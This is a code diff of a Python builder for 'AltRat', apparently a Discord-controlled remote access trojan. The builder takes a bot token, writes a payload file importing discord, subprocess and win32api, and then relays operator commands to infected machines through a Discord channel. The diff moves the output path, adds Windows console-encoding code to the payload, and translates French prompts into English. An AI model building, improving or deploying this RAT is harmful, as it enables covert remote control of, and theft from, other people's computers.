@@ -122,18 +122,13 @@ help_text = """
         
 
 print(help_text)
-input("press enter to create the AltRat file...")
+input("press enter to create the AltRat.py file...")
 
-            
-desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+script_dir = os.path.dirname(os.path.abspath(__file__))
+file_path = os.path.join(script_dir, "AltRat.py")
 
-                
-file_path = os.path.join(desktop_path, "AltRat.py")
-
-            
 token = input("Bot token discord : ")
 
-                
 file_content = f"""
 import discord
 import subprocess
@@ -152,6 +147,21 @@ import win32api
 from datetime import datetime
 from flask import Flask, send_from_directory
 from threading import Thread
+import ctypes
+import ctypes.wintypes
+
+if sys.platform == "win32":
+    _k32 = ctypes.windll.kernel32
+    for _hid in (-10, -11, -12):
+        _h = _k32.GetStdHandle(_hid)
+        _m = ctypes.wintypes.DWORD(0)
+        if _k32.GetConsoleMode(_h, ctypes.byref(_m)):
+            _k32.SetConsoleMode(_h, _m.value | 0x0004 | 0x0001)
+    _k32.SetConsoleOutputCP(65001)
+    _k32.SetConsoleCP(65001)
+    if hasattr(sys.stdout, 'reconfigure'):
+        try: sys.stdout.reconfigure(encoding='utf-8', errors='replace')
+        except: pass
 
 intents = discord.Intents.default()
 intents.typing = False
@@ -329,7 +339,6 @@ async def on_ready():
 client.run(TOKEN)
 """
 
-
 with open(file_path, "w") as file:
     file.write(file_content)
 
@@ -339,7 +348,7 @@ print(f"AltRat here : {file_path}")
 command = input("Wait until the AltRat file is running before connecting, otherwise it won’t work (connect only once it’s running)")
 
                 
-channel_id = input("Veuillez entrer l'ID du canal: ")
+channel_id = input("Channel id: ")
 
 async def send_command_to_bot(command):
     await bot_channel.send(command)
@@ -353,7 +362,7 @@ async def receive_response():
 
 async def main():
     while True:
-        command = input("Entrez une commande (ou 'exit' pour quitter) : ")
+        command = input("Enter commands (or 'exit' for leave) : ")
 
         if command.lower() == 'exit':
             break
